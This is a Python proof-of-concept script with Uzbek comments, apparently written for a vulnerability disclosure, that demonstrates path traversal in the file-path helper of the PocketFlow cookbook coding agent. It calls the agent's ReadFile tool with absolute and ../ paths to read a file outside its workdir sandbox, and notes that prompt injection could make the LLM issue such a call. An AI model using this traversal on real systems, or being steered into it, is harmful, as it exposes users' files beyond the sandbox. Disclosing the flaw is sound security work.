at poc_path.py 
"""
PoC: Path Traversal in pocketflow-coding-agent (PocketFlow cookbook)

Zaif joy: cookbook/pocketflow-coding-agent/nodes.py
    def _path(workdir, p): return os.path.join(workdir, p)

Bu funksiya `workdir` ichiga cheklashga MO'LJALLANGAN, lekin:
  - agar `p` absolyut yo'l bo'lsa (masalan "/etc/passwd"),
    os.path.join(workdir, p) natijasi shunchaki `p` bo'ladi (workdir e'tiborga olinmaydi)
  - agar `p` "../../.." bilan boshlansa, workdir'dan yuqoriga chiqib ketadi

Bu PoC LLM chaqirmaydi (call_llm kerak emas) — u faqat ToolNode'larning
`exec()` metodini to'g'ridan-to'g'ri chaqiradi, xuddi orkestrator (LLM qaror
qabul qiluvchi qism) zararli "tool call" argumentini yuborgandagidek.
Amaliyotda bu argument prompt-injection orqali LLM tomonidan ishlab
chiqarilishi mumkin.
"""

import sys
import os

# nodes.py joylashgan katalogni import yo'liga qo'shamiz 
COOKBOOK_DIR = "/home/pwl/cve/PocketFlow/cookbook/pocketflow-coding-agent"
sys.path.insert(0, COOKBOOK_DIR)

from nodes import ReadFile, ListFiles, _path  # noqa: E402

WORKDIR = os.path.abspath("workdir")          # agent "ishlashi kerak" bo'lgan sandbox
SECRET = os.path.abspath("secret_zone/topsecret.txt")  # sandboxdan TASHQARIDAGI fayl

print("=" * 70)
print("1) _path() funksiyasining o'zini tekshirish")
print("=" * 70)
print(f"workdir           = {WORKDIR}")
print(f"maqsad (absolyut) = {SECRET}")
resolved = _path(WORKDIR, SECRET)
print(f"_path(workdir, SECRET) natijasi = {resolved}")
print(f"=> workdir ichidami? {resolved.startswith(WORKDIR)}")

print()
print("=" * 70)
print("2) Nisbiy (../) traversal bilan tekshirish")
print("=" * 70)
rel_traversal = os.path.relpath(SECRET, WORKDIR)  # masalan ../secret_zone/topsecret.txt
print(f"nisbiy traversal yo'li = {rel_traversal}")
resolved2 = _path(WORKDIR, rel_traversal)
print(f"_path(workdir, '{rel_traversal}') natijasi = {resolved2}")
print(f"=> workdir ichidami? {os.path.abspath(resolved2).startswith(WORKDIR)}")

print()
print("=" * 70)
print("3) Haqiqiy ReadFile tool orqali (LLM 'tool_call' jo'natgandek)")
print("=" * 70)

# Bu — LLM/agent orkestratori RunCommand/ReadFile tool'ini chaqirganda
# 'shared' ichida bo'ladigan tipik holat:
shared_absolute = {
    "tool_call": {"tool": "read_file", "args": {"path": SECRET}},
    "workdir": WORKDIR,
}
reader = ReadFile()
prep = reader.prep(shared_absolute)
try:
    result = reader.exec(prep)
    print("[ABSOLYUT YO'L HUJUMI MUVAFFAQIYATLI]")
    print("O'qilgan tarkib (workdir'dan tashqaridagi 'maxfiy' fayl):")
    print("  " + result.strip())
except Exception as e:
    print(f"Xatolik: {e}")

print()
shared_relative = {
    "tool_call": {"tool": "read_file", "args": {"path": rel_traversal}},
    "workdir": WORKDIR,
}
prep2 = reader.prep(shared_relative)
try:
    result2 = reader.exec(prep2)
    print("[../ TRAVERSAL HUJUMI MUVAFFAQIYATLI]")
    print("O'qilgan tarkib:")
    print("  " + result2.strip())
except Exception as e:
    print(f"Xatolik: {e}")

print()
print("=" * 70)
print("XULOSA: Ikkala usul ham workdir sandboxidan tashqarida joylashgan")
print("faylni o'qishga muvaffaq bo'ldi. Bu Path Traversal (CWE-22).")
print("=" * 70)
                                                                                                                                                             
┌──(pwl㉿kali)-[~/cve/PocketFlow]
└─$ 
